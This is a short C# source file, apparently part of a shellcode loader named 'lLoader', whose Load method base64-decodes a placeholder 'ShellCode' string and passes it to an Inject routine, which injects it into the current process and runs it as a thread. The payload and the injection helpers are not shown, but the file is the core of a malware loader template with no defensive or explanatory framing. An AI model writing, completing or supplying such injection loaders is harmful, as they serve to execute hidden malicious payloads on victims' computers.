using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace lLoader
{
    internal class setting
    {
       
        public static void Load() {
            string data = "ShellCode";
            IntPtr ThreadEx =  Runner.Inject(Convert.FromBase64String(data),  (int)WinAPI.GetCurrentProcessId());
            if (ThreadEx == IntPtr.Zero) { return; }
            WinAPI.WaitForSingleObject(ThreadEx, WinAPI.INFINITE);
            WinAPI.CloseHandle(ThreadEx);

        }
    }
}
